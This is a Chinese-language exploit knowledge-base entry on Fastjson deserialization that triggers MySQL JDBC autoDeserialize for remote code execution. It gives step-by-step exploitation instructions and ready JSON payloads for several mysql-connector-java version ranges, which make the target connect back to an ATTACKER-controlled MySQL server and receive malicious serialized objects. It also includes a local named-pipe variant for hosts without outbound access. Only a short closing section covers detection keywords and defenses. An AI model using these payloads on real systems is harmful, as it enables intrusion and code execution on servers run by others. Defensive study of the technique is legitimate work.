---
id: web-java-deser-fastjson-mysql-jdbc-autodeserialize
title: Fastjson 触发 MySQL JDBC autoDeserialize：恶意 MySQL 服务端返回序列化对象 RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-mysql-jdbc-autodeserialize
aliases:
- MySQL JDBC 反序列化
- autoDeserialize
- ServerStatusDiffInterceptor
- fastjson MySQL JDBC
- NamedPipeSocketFactory
- mysql-connector-java 反序列化
tags:
- java
- fastjson
- deserialization
- jdbc
- mysql
- autodeserialize
- named-pipe
- rce
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: mysql-connector-java 5.1.1–5.1.48、6.0.2/6.0.3、<=8.0.19（原文标记）
---

## 一句话结论

Fastjson 实例化 MySQL JDBC 连接类时，把 `autoDeserialize=true` 与 `statementInterceptors=ServerStatusDiffInterceptor` 写进连接属性，目标会连接攻击者控制的 MySQL 服务；服务端在握手/查询响应里返回序列化对象，驱动自动 `readObject`，形成反序列化 RCE。无出网条件时改用 `NamedPipeSocketFactory` 读取本地管道文件。

## 原理

MySQL Connector/J 在 `autoDeserialize=true` 时会反序列化服务端返回的某些字段（如 `SHOW SESSION STATUS` 结果）。`ServerStatusDiffInterceptor` 这类拦截器会在连接初始化时触发查询，使恶意服务端有机会返回序列化 payload。

Fastjson 只需要能实例化对应连接类并触发其构造/连接逻辑：

- 5.1.x：`com.mysql.jdbc.JDBC4Connection`，字段 `hostToConnectTo`、`portToConnectTo`、`info`（含 `user`、`statementInterceptors`、`autoDeserialize`、`NUM_HOSTS`）、`databaseToConnectTo`；
- 6.0.2/6.0.3：`com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection`，`proxy.connectionString.url` 带完整 JDBC URL；
- <=8.0.19：`com.mysql.cj.jdbc.ha.ReplicationMySQLConnection` + `LoadBalancedConnectionProxy` + `ReplicationConnectionUrl`，属性里设置 `queryInterceptors`/`autoDeserialize`。

8.0.19 的调用栈显示触发点在 `LoadBalancedConnectionProxy` 构造 → `RandomBalanceStrategy.pickConnection` → `createConnectionForHost` → `ConnectionImpl.setAutoCommit`，即实例化阶段就会建连。

## 触发条件

- 目标 classpath 存在对应版本 MySQL Connector/J；
- 目标能出网访问攻击者的 MySQL 服务（默认 3306）或本地存在可读管道文件；
- Fastjson 反序列化点能加载上述连接类（1.2.68 用 `AutoCloseable` 期望类，1.2.80 用 `Exception` 缓存或相应绕过）；
- 攻击者能运行返回恶意序列化数据的 MySQL 服务端（如 MySQL_Fake_Server）。

## 利用步骤

1. 用依赖探测确认 MySQL 驱动版本（`com.mysql.jdbc.Buffer`、`com.mysql.cj.protocol.AuthenticationProvider` 等）；
2. 起恶意 MySQL 服务端，配置返回 gadget 序列化字节（ysoserial/自定义）；
3. 按版本构造 Fastjson JSON：外层 `@type` 用 `java.lang.AutoCloseable`（1.2.68）或 `java.lang.Exception` 路线（1.2.80），内层实例化连接类；
4. 设置 `autoDeserialize=true`、`statementInterceptors=ServerStatusDiffInterceptor`、`user`/`password`/`NUM_HOSTS` 等；
5. 目标回连后，服务端在握手/查询响应中返回序列化对象，触发 `readObject`；
6. 无出网时：先用任意文件写把序列化 payload 写到本地管道/文件，再用 `NamedPipeSocketFactory` + `namedPipePath` 让驱动从本地读取。

## PoC

5.1.1–5.1.48 出网：

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "ATTACKER",
    "portToConnectTo": 3306,
    "info": {
      "user": "u",
      "password": "p",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "test",
    "url": ""
  }
}
```

6.0.2/6.0.3：

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
      "connectionString": {
        "url": "jdbc:mysql://ATTACKER:3306/test?user=u&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
      }
    }
  }
}
```

<=8.0.19：

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
      "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
      "connectionUrl": {
        "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
        "masters": [{}],
        "slaves": [],
        "properties": {
          "host": "ATTACKER",
          "port": "3306",
          "user": "u",
          "dbname": "test",
          "password": "p",
          "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize": "true"
        }
      }
    }
  }
}
```

不出网（管道文件）：

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
      "useSSL": "false",
      "user": "mysql",
      "HOST": "xxx",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1",
      "socketFactory": "com.mysql.jdbc.NamedPipeSocketFactory",
      "namedPipePath": "/tmp/mysql.pcap",
      "DBNAME": "test"
    },
    "databaseToConnectTo": "test",
    "url": ""
  }
}
```

## 变体与关联

- 8.x 无出网：`com.mysql.cj.protocol.NamedPipeSocketFactory` + `path` 字段；先用写文件链把恶意序列化数据写入管道文件。
- 6.x/8.x 的 `LoadBalancedMySQLConnection`/`ReplicationMySQLConnection` 字段结构不同，需按版本换类名和属性名。
- 与 PostgreSQL 链对比：MySQL 走驱动反序列化，PostgreSQL 走 `socketFactory=ClassPathXmlApplicationContext` 加载远程 XML。
- 关联：[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]（写管道文件/触发外层）；[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（1.2.80 用 jackson 缓存把 InputStream/JDBC 链拉起）。

## 检测与防御

- 检测：JSON 中出现 `autoDeserialize`、`ServerStatusDiffInterceptor`、`NamedPipeSocketFactory`、`JDBC4Connection`、`LoadBalancedMySQLConnection`、`ReplicationMySQLConnection`；应用异常连接外部 3306 或读取本地管道。
- 防御：升级 fastjson 与 MySQL 驱动（8.0.20+ 默认关闭 `autoDeserialize`）；不要开启 `autoDeserialize`；对 `@type` 做白名单；限制应用出网与本地管道访问。
- 注意：`autoDeserialize=true` 是驱动侧危险配置，即使没有 Fastjson，其他反序列化入口也可能触发。
